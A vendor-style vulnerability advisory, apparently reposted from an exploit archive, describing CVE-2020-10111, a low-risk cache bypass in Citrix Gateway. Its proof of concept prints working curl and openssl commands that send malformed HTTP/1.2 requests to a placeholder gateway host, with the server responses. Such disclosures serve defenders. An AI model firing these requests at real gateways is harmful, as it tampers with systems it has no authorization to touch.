@@ -1,0 +1,91 @@
+id: 34070
+date: 03/09/2020
+title: Citrix Gateway 11.1 / 12.0 / 12.1 Cache Bypass Vulnerability
+author: Micha Borrmann
+cves: CVE-2020-10111
+
+Product:                   Citrix Gateway
+Manufacturer:              Citrix Systems, Inc.
+Affected Version(s):       11.1, 12.0, 12.1
+Tested Version(s):         11.1.63.15, 12.0.63.13, 12.1.55.18
+Vulnerability Type:        Inconsistent Interpretation of HTTP Requests (CWE-444)
+Risk Level:                Low
+Solution Status:           Open
+Manufacturer Notification: 2020-01-31
+Solution Date:             no solution
+Public Disclosure:         2020-03-05
+CVE Reference:             CVE-2020-10111
+Author of Advisory:        Micha Borrmann (SySS GmbH)
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Overview:
+
+"Citrix Gateway is a customer-managed solution that can be deployed on
+premises or on any public cloud, such as AWS, Azure, or Google Cloud
+Platform.  Citrix Gateway provides users with secure access and single
+sign-on to all the virtual, SaaS and web applications they need to be
+productive." (see [1])
+
+The solution contains a caching system, which stores content for a
+static period of time.  With a simple attack the cache can be
+bypassed.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Vulnerability Details:
+
+Requests with the invalid and not specified protocols declared as
+HTTP/1.2 up to HTTP/1.9 can be used to bypass the caching system.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Proof of Concept (PoC):
+
+As described in the security advisory SYSS-2020-005, the cache can be
+poisoned. The value in the cache was poisoned with the value 42. But
+this request should be answered with the value 23.
+
+$ curl --include --url https://$NSGATEWAYHOST/logon/incremental.php --data "value=22"
+HTTP/1.1 200 OK
+Age: 5         
+Date: Fri, 31 Jan 2020 12:26:03 GMT
+Expires: Thu, 01 Jan 1970 00:00:01 GMT
+Cache-Control: no-store, must-revalidate
+Connection: Keep-Alive
+Via: NS-CACHE-10.0: 121
+ETag: "KXGGENKFDKOU"
+Server: Apache
+X-Frame-Options: SAMEORIGIN
+Pragma: no-cache
+Content-Length: 3
+Content-Type: text/html; charset=UTF-8
+
+42
+
+
+Using HTTP/1.2 in the request, the cache can be bypassed and in the
+PoC request the value will be processed correctly.
+
+$ VALUE=22; echo -e "POST /logon/incremental.php HTTP/1.2\nHost: $NSGATEWAYHOST\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: $[${#VALUE}+6]\n\nvalue=$VALUE"|openssl s_client -connect $NSGATEWAYHOST:https -quiet
+depth=2 C = US, ST = New Jersey, L = Jersey City, O = The USERTRUST Network, CN = USERTrust RSA Certification Authority
+verify return:1
+depth=1 C = GB, ST = Greater Manchester, L = Salford, O = Sectigo Limited, CN = Sectigo RSA Domain Validation Secure Server CA
+verify return:1
+depth=0 CN = $NSGATEWAYHOST
+verify return:1
+HTTP/1.1 200 OK
+Date: Fri, 31 Jan 2020 12:27:42 GMT
+Server: Apache
+X-Frame-Options: SAMEORIGIN
+Cache-Control: no-store, must-revalidate
+Pragma: no-cache
+Expires: 0
+Content-Length: 3
+Keep-Alive: timeout=15, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+23
+
+#  0day.today [2023-03-23]  #
